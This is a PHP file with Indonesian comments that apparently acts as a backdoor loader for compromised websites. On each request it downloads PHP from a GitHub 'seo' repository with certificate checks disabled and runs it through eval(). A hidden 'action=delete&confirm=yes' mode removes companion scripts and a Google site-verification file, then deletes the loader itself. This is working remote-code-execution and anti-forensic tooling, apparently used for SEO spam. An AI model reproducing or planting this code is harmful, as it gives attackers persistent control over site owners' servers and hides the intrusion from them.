<?php
// --- [BLOK LOGIKA PENGHAPUSAN] ---
// Loader INI hanya menangani eksekusi penghapusan.
if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {

    // Setel path yang benar
    $server_path = dirname(__FILE__);
    $self_script_path = __FILE__; // <-- Ini adalah file 'route.php'/'loader.php' Anda
    $local_google_path = $server_path . '/google8f39414e57a5615a.html';
    $full_domain_url = 'https://' . ($_SERVER['HTTP_HOST'] ?? 'domain.com');

    $files_to_delete = [
        $server_path . '/v1.php',
        $server_path . '/v2.php',
        $server_path . '/v3.php',
        $server_path . '/v4.php',
        $server_path . '/v5.php',
        $server_path . '/vx.php',
        $local_google_path 
    ];

    $deleted_files_log = [];

    // Hapus semua file target
    foreach ($files_to_delete as $file) {
        if (file_exists($file)) {
            if (@unlink($file)) {
                $deleted_files_log[] = basename($file) . ' ... Dihapus';
            } else {
                $deleted_files_log[] = basename($file) . ' ... Gagal Dihapus';
            }
        }
    }

    // Tampilkan output HTML terakhir SEBELUM menghapus diri sendiri
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Script Deleted</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 600px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; }
        .log-error { color: #ff5f57; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">delete.script</div>
            </div>
            <div class="terminal-content">';
    
    // Tampilkan log hasil penghapusan
    foreach ($deleted_files_log as $log) {
        $log_type = (strpos($log, 'GAGAL') !== false) ? 'log-error' : 'log-success';
        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span class="' . $log_type . '">' . htmlspecialchars($log) . '</span></div>';
    }

    // Upaya menghapus diri sendiri
    if (@unlink($self_script_path)) {
        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span class="log-success">' . htmlspecialchars(basename($self_script_path)) . ' ... Dihapus (Self-destruct)</span></div>';
        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span style="color: #666;">Domain disalin ke clipboard: ' . htmlspecialchars($full_domain_url) . '</span></div>';
    } else {
        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span class="log-error">' . htmlspecialchars(basename($self_script_path)) . ' ... GAGAL Dihapus (File terkunci)</span></div>';
    }
    
    echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span style="color: #666;">Semua operasi selesai</span></div>';
    echo '</div></div></body></html>';
    
    // Pastikan output dikirim ke browser
    @ob_flush();
    flush();
    
    // Putuskan koneksi browser agar file lock terlepas
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    }
    
    // Coba hapus diri sendiri (LAGI, jika yang pertama gagal)
    @unlink($self_script_path); 
    exit; // Hentikan skrip di sini. Jangan panggil eval().
}
// --- [AKHIR BLOK PENGHAPUSAN] ---


// --- [BLOK LOADER/EVAL] ---
// Kode ini hanya akan berjalan jika BUKAN mode hapus (confirm=yes).
// Ganti URL ini dengan URL ke file x.php (Bagian 2) di GitHub Anda
$url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/route.php'; 

if (($content = @file_get_contents($url)) || ($content = curl_get_contents($url))) {
 eval('?>' . $content);
}

function curl_get_contents($url) {
 if (!function_exists('curl_init')) return false;

 $ch = curl_init();
 curl_setopt_array($ch, [
 CURLOPT_URL => $url,
 CURLOPT_RETURNTRANSFER => true,
 CURLOPT_FOLLOWLOCATION => true,
 CURLOPT_SSL_VERIFYPEER => false,
 CURLOPT_USERAGENT => 'PHP'
 ]);

 $content = curl_exec($ch);
 curl_close($ch);
 return $content;
}
?>
